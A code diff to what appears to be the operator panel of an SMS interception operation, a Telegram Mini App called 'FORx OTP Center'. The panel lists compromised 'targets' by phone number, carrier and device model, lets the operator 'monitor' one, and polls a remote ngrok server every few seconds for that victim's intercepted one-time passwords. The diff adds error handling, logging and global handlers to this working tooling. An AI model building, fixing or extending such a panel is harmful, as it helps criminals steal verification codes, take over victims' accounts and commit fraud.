@@ -5,16 +5,15 @@
     <title>FORx OTP Center</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        :root { --bg: #0a0a0a; --card: #1e1e1e; --green: #2ecc71; --red: #e74c3c; --text: #eee; }
-        body { background:var(--bg); color:var(--text); font-family:sans-serif; margin:0; padding:10px; }
+        body { background:#0a0a0a; color:#e0e0e0; font-family:sans-serif; margin:0; padding:15px; }
         .tabs { display:flex; gap:5px; margin-bottom:10px; }
-        .tab { flex:1; padding:10px; background:var(--card); text-align:center; border-radius:8px 8px 0 0; cursor:pointer; }
-        .tab.active { background:var(--green); color:#000; }
+        .tab { flex:1; padding:10px; background:#1e1e1e; text-align:center; border-radius:8px 8px 0 0; cursor:pointer; }
+        .tab.active { background:#2ecc71; color:#000; }
         .panel { display:none; }
         .panel.active { display:block; }
-        .card { background:var(--card); border-radius:10px; padding:12px; margin:8px 0; display:flex; justify-content:space-between; align-items:center; }
-        .btn { background:var(--green); color:#000; border:none; padding:8px 14px; border-radius:6px; font-weight:bold; cursor:pointer; }
-        .btn.stop { background:var(--red); }
+        .card { background:#1e1e1e; border-radius:10px; padding:12px; margin:8px 0; display:flex; justify-content:space-between; align-items:center; }
+        .btn { background:#2ecc71; color:#000; border:none; padding:8px 14px; border-radius:6px; font-weight:bold; cursor:pointer; }
+        .btn.stop { background:#e74c3c; }
         #feed { height:350px; overflow-y:auto; background:#111; border-radius:8px; padding:8px; }
         .otp { background:#2c3e50; margin:5px 0; padding:8px; border-radius:5px; font-size:14px; }
         input, button { font-size:14px; }
@@ -29,68 +28,89 @@
 
     <div id="targets-panel" class="panel active">
         <input type="text" id="search" placeholder="Filter by phone..." oninput="filterTargets()">
-        <div id="targets-list"></div>
+        <div id="targets-list"><p>Loading...</p></div>
     </div>
     <div id="favourites-panel" class="panel">
         <button onclick="loadFavourites()">🔄 Refresh</button>
-        <div id="favourites-list"></div>
+        <div id="favourites-list"><p>Loading...</p></div>
     </div>
     <div id="feed-panel" class="panel">
-        <div id="feed"></div>
+        <div id="feed"><p>No OTPs yet...</p></div>
     </div>
 
     <script>
+        // ========== CONFIG ==========
+        const API = 'https://limit-crispness-uncork.ngrok-free.dev';   // <--- CHANGE THIS
         const tg = Telegram.WebApp;
-        // ⚠️ CHANGE THIS to your actual ngrok URL when testing locally
-        const API = 'https://limit-crispness-uncork.ngrok-free.dev';   // <--- UPDATE THIS
-        const userId = tg.initDataUnsafe.user.id;
+        tg.ready();
+        const userId = tg.initDataUnsafe?.user?.id || null;
+
+        if (!userId) {
+            document.body.innerHTML = '<p style="color:red;">❌ Could not get user ID. Please open via bot.</p>';
+            throw new Error('No user ID');
+        }
+
         let allTargets = [];
         let monitorActive = false;
         let pollTimer = null;
         let lastOtpTs = 0;
 
+        console.log('Mini app started, userId:', userId);
+        console.log('API base:', API);
+
         // ----- Tab switching -----
-        function switchTab(tab) {
+        window.switchTab = function(tab) {
             document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
             document.getElementById(tab+'-panel').classList.add('active');
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
             event.target.classList.add('active');
             if (tab === 'targets') loadTargets();
             if (tab === 'favourites') loadFavourites();
-        }
+        };
 
         // ----- Targets -----
         async function loadTargets() {
             try {
-                let res = await fetch(`${API}/api/targets`);
+                console.log('Fetching targets...');
+                let res = await fetch(`${API}/api/targets`, { headers: {'Authorization': userId} });
+                console.log('Response status:', res.status);
+                if (!res.ok) throw new Error('HTTP ' + res.status);
                 allTargets = await res.json();
+                console.log('Targets loaded:', allTargets.length);
                 renderTargets(allTargets);
-            } catch(e) { console.error(e); }
+            } catch(e) {
+                console.error('Load targets error:', e);
+                document.getElementById('targets-list').innerHTML = `<p style="color:red;">❌ Failed to load targets: ${e.message}</p>`;
+            }
         }
 
         function renderTargets(targets) {
             let html = '';
-            targets.forEach(t => {
-                let carrierInfo = t.carrier1 !== 'Unknown' ? ` (${t.carrier1})` : '';
-                html += `<div class="card">
-                    <div><b>${t.phone1}</b>${carrierInfo}<br><small>${t.model} | DB-${t.db_index}</small></div>
-                    <button class="btn" onclick="startMonitor('${t.did}', ${t.db_index}, '${t.phone1}', '${t.model}', '${t.phone2||''}', '${t.carrier1||''}', '${t.carrier2||''}')">▶️</button>
-                    <button class="btn" style="background:#f39c12;" onclick="addFavourite('${t.did}', '${t.phone1}', '${t.phone2||''}', '${t.carrier1||''}', '${t.carrier2||''}', '${t.model}', ${t.db_index})">⭐</button>
-                </div>`;
-            });
-            document.getElementById('targets-list').innerHTML = html || '<p>No online targets.</p>';
+            if (targets.length === 0) {
+                html = '<p>No online targets. Scanner may be warming up.</p>';
+            } else {
+                targets.forEach(t => {
+                    let carrierInfo = t.carrier1 !== 'Unknown' ? ` (${t.carrier1})` : '';
+                    html += `<div class="card">
+                        <div><b>${t.phone1}</b>${carrierInfo}<br><small>${t.model} | DB-${t.db_index}</small></div>
+                        <button class="btn" onclick="startMonitor('${t.did}', ${t.db_index}, '${t.phone1}', '${t.model}', '${t.phone2||''}', '${t.carrier1||''}', '${t.carrier2||''}')">▶️</button>
+                        <button class="btn" style="background:#f39c12;" onclick="addFavourite('${t.did}', '${t.phone1}', '${t.phone2||''}', '${t.carrier1||''}', '${t.carrier2||''}', '${t.model}', ${t.db_index})">⭐</button>
+                    </div>`;
+                });
+            }
+            document.getElementById('targets-list').innerHTML = html;
         }
 
-        function filterTargets() {
+        window.filterTargets = function() {
             let query = document.getElementById('search').value.toLowerCase();
             let filtered = allTargets.filter(t => 
                 t.phone1.includes(query) || (t.phone2 && t.phone2.includes(query))
             );
             renderTargets(filtered);
-        }
+        };
 
         // ----- Monitoring -----
-        async function startMonitor(did, dbIndex, phone1, model, phone2, car1, car2) {
+        window.startMonitor = async function(did, dbIndex, phone1, model, phone2, car1, car2) {
             if (monitorActive) {
                 await fetch(`${API}/api/monitor`, { method: 'DELETE', headers: {'Content-Type':'application/json'}, body: JSON.stringify({user_id: userId}) });
             }
@@ -105,12 +125,13 @@
                 pollOTP();
                 pollTimer = setInterval(pollOTP, 3000);
             }
-        }
+        };
 
         // ----- OTP Polling -----
         async function pollOTP() {
             try {
                 let res = await fetch(`${API}/api/otp/${userId}?since=${lastOtpTs}`);
+                if (!res.ok) return;
                 let msgs = await res.json();
                 if (msgs.length) {
                     let feed = document.getElementById('feed');
@@ -120,45 +141,53 @@
                     });
                     feed.scrollTop = feed.scrollHeight;
                 }
-            } catch(e) {}
+            } catch(e) { console.error('OTP poll error:', e); }
         }
 
         // ----- Favourites -----
         async function loadFavourites() {
-            let res = await fetch(`${API}/api/favourites/${userId}`);
-            let favs = await res.json();
-            let html = '';
-            favs.forEach(f => {
-                html += `<div class="card">
-                    <div><b>${f.phone1}</b> (${f.carrier1})<br><small>${f.model} | DB-${f.db_index}</small></div>
-                    <button class="btn" onclick="startMonitor('${f.did}', ${f.db_index}, '${f.phone1}', '${f.model}')">▶️</button>
-                    <button class="btn stop" onclick="removeFavourite('${f.did}')">🗑️</button>
-                </div>`;
-            });
-            document.getElementById('favourites-list').innerHTML = html || '<p>No favourites.</p>';
+            try {
+                let res = await fetch(`${API}/api/favourites/${userId}`);
+                if (!res.ok) throw new Error('Failed');
+                let favs = await res.json();
+                let html = '';
+                if (favs.length === 0) html = '<p>No favourites.</p>';
+                else {
+                    favs.forEach(f => {
+                        html += `<div class="card">
+                            <div><b>${f.phone1}</b> (${f.carrier1})<br><small>${f.model} | DB-${f.db_index}</small></div>
+                            <button class="btn" onclick="startMonitor('${f.did}', ${f.db_index}, '${f.phone1}', '${f.model}')">▶️</button>
+                            <button class="btn stop" onclick="removeFavourite('${f.did}')">🗑️</button>
+                        </div>`;
+                    });
+                }
+                document.getElementById('favourites-list').innerHTML = html;
+            } catch(e) {
+                document.getElementById('favourites-list').innerHTML = `<p style="color:red;">Error loading favourites.</p>`;
+            }
         }
 
-        async function addFavourite(did, phone1, phone2, car1, car2, model, dbIndex) {
+        window.addFavourite = async function(did, phone1, phone2, car1, car2, model, dbIndex) {
             await fetch(`${API}/api/favourites/${userId}`, {
                 method: 'POST',
                 headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({ did, phone1, phone2, carrier1: car1, carrier2: car2, model, db_index: dbIndex })
             });
             tg.showAlert('Added to favourites');
-        }
+        };
 
-        async function removeFavourite(did) {
+        window.removeFavourite = async function(did) {
             await fetch(`${API}/api/favourites/${userId}`, {
                 method: 'DELETE',
                 headers: {'Content-Type':'application/json'},
                 body: JSON.stringify({ did })
             });
             loadFavourites();
-        }
+        };
 
         // Initial load
         loadTargets();
-        setInterval(loadTargets, 30000);  // refresh targets every 30s
+        setInterval(loadTargets, 30000);
     </script>
 </body>
 </html>
